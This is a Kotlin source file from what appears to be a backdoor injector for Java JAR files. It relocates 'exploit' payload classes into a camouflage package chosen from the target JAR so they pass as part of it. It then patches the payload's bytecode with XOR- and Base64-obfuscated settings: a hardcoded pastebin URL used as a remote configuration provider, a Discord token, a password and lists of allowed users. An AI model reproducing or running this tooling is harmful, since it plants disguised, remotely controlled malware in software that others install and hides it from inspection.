package com.tmquan2508.inject.injector.modules

import com.rikonardo.cafebabe.ClassFile
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.utils.generateCamouflagePlan
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.tree.ClassNode
import org.objectweb.asm.tree.LdcInsnNode
import java.io.File
import java.security.SecureRandom
import java.util.Base64

data class ProcessedPayload(
    val finalClasses: List<ClassFile>,
    val finalMainPayloadName: String
)

internal fun processPayload(
    rawPayloadClasses: List<ClassFile>, camouflageEnabled: Boolean, targetJar: File, uuids: String,
    usernames: String, prefix: String, injectOther: String, warnings: String,
    discordToken: String, password: String, camouflage: String
): ProcessedPayload {
    val originalMainPayloadName = "com/tmquan2508/exploit/Config"

    val relocationMap = if (camouflageEnabled) {
        Logs.info(" -> Camouflage enabled. Generating camouflage plan...")
        val plan = generateCamouflagePlan(targetJar)
        Logs.info(" -> Selected camouflage package: '${plan.packageName}' with prefix '${plan.namePrefix}'")
        rawPayloadClasses.associate {
            val simpleName = it.name.substringAfterLast("/")
            it.name to "${plan.packageName}/${plan.namePrefix}$simpleName"
        }
    } else {
        emptyMap()
    }

    val relocatedClasses = relocateClasses(rawPayloadClasses, relocationMap)
    val finalMainPayloadName = relocationMap[originalMainPayloadName] ?: originalMainPayloadName
    val targetConfigClassName = relocationMap[originalMainPayloadName] ?: originalMainPayloadName

    val finalClasses = applyConfigurationWithAsm(
        classes = relocatedClasses, targetClassName = targetConfigClassName, uuids = uuids, usernames = usernames,
        prefix = prefix, injectOther = injectOther, warnings = warnings, discordToken = discordToken,
        password = password, camouflage = camouflage
    )

    return ProcessedPayload(finalClasses, finalMainPayloadName)
}

private fun relocateClasses(classes: List<ClassFile>, relocationMap: Map<String, String>): List<ClassFile> {
    if (relocationMap.isEmpty()) return classes
    val sortedKeys = relocationMap.keys.sortedByDescending { it.length }
    return classes.map { originalClassFile ->
        val classFile = ClassFile(originalClassFile.compile())
        classFile.name = relocationMap[classFile.name] ?: classFile.name
        for (constant in classFile.constantPool.entries) {
            if (constant is com.rikonardo.cafebabe.data.constantpool.ConstantUtf8) {
                var tempValue = constant.value
                for (key in sortedKeys) {
                    relocationMap[key]?.let { newValue ->
                        tempValue = tempValue.replace(key, newValue)
                    }
                }
                constant.value = tempValue
            }
        }
        classFile
    }
}

private object AsmValueInjector {
    private object DynamicKeyEncoder {
        fun generateRandomKey(length: Int): String {
            val chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            val rnd = SecureRandom()
            val sb = StringBuilder(length)
            repeat(length) { sb.append(chars[rnd.nextInt(chars.length)]) }
            return sb.toString()
        }

        fun encrypt(plainText: String, key: String): String {
            val plainBytes = plainText.toByteArray(Charsets.UTF_8)
            val keyBytes = key.toByteArray(Charsets.UTF_8)
            val result = ByteArray(plainBytes.size)
            for (i in plainBytes.indices) {
                result[i] = (plainBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte()
            }
            return Base64.getEncoder().encodeToString(result)
        }
    }

    private object StaticKeyEncoder {
        private const val SECRET_KEY = "openbd.secret.key"
        fun encrypt(plainText: String): String {
            val inputBytes = plainText.toByteArray(Charsets.UTF_8)
            val keyBytes = SECRET_KEY.toByteArray(Charsets.UTF_8)
            val outputBytes = ByteArray(inputBytes.size)
            for (i in inputBytes.indices) {
                outputBytes[i] = (inputBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte()
            }
            return Base64.getEncoder().encodeToString(outputBytes)
        }
    }

    fun inject(originalBytecode: ByteArray, placeholders: Map<String, String>): ByteArray {
        val classReader = ClassReader(originalBytecode)
        val classNode = ClassNode()
        classReader.accept(classNode, 0)
        var changed = false
        for (method in classNode.methods) {
            for (instruction in method.instructions) {
                if (instruction is LdcInsnNode) {
                    val constant = instruction.cst
                    if (constant is String && placeholders.containsKey(constant)) {
                        instruction.cst = placeholders[constant]!!
                        Logs.debug("  [ASM-LDC] Replaced '${constant}' in ${classNode.name}.${method.name}")
                        changed = true
                    }
                }
            }
        }
        if (!changed) Logs.warn(" -> [ASM-WARN] No placeholders were replaced in ${classNode.name}")
        val classWriter = ClassWriter(ClassWriter.COMPUTE_FRAMES)
        classNode.accept(classWriter)
        return classWriter.toByteArray()
    }

    fun buildFinalPlaceholderMap(
        uuids: String, usernames: String, prefix: String, injectOther: String, warnings: String,
        discordToken: String, password: String, camouflage: String
    ): Map<String, String> {
        val finalMap = mutableMapOf<String, String>()

        val urlProvider = "https://pastebin.com/raw/JD0bB1Eb"
        val randomKey = DynamicKeyEncoder.generateRandomKey(32)
        Logs.debug(" -> Generated dynamic key: $randomKey")

        val encryptedUrl = DynamicKeyEncoder.encrypt(urlProvider, randomKey)
        Logs.debug("  [ENCRYPT-DYN] '$urlProvider' -> '$encryptedUrl'")

        finalMap["::KEY::"] = randomKey
        finalMap["::S_URL_PROVIDER::"] = encryptedUrl

        val otherConfigs = mapOf(
            "::UUIDS::" to uuids,
            "::USERNAMES::" to usernames,
            "::PREFIX::" to prefix,
            "::INJECT_OTHER::" to injectOther,
            "::WARNINGS::" to warnings,
            "::DISCORD_TOKEN::" to discordToken,
            "::PASSWORD::" to password,
            "::CAMOUFLAGE::" to camouflage,
            "::TRUE::" to "true"
        )

        otherConfigs.forEach { (placeholder, plainText) ->
            val encryptedValue = StaticKeyEncoder.encrypt(plainText)
            finalMap[placeholder] = encryptedValue
            Logs.debug("  [ENCRYPT-STATIC] '${plainText}' -> '${encryptedValue.take(10)}...'")
        }

        return finalMap
    }
}

private fun applyConfigurationWithAsm(
    classes: List<ClassFile>, targetClassName: String, uuids: String, usernames: String, prefix: String,
    injectOther: String, warnings: String, discordToken: String, password: String, camouflage: String
): List<ClassFile> {
    val targetIndex = classes.indexOfFirst { it.name == targetClassName }
    if (targetIndex == -1) {
        Logs.warn("Could not find configuration target class '$targetClassName'. Skipping.")
        return classes
    }

    val replacementMap = AsmValueInjector.buildFinalPlaceholderMap(
        uuids, usernames, prefix, injectOther, warnings, discordToken, password, camouflage
    )

    val originalTargetFile = classes[targetIndex]

    val modifiedBytecode = AsmValueInjector.inject(originalTargetFile.compile(), replacementMap)

    val modifiedClassFile = ClassFile(modifiedBytecode)
    modifiedClassFile.name = originalTargetFile.name

    val finalClasses = classes.toMutableList()
    finalClasses[targetIndex] = modifiedClassFile
    Logs.info(" -> Successfully applied combined encrypted configuration using ASM.")
    return finalClasses
}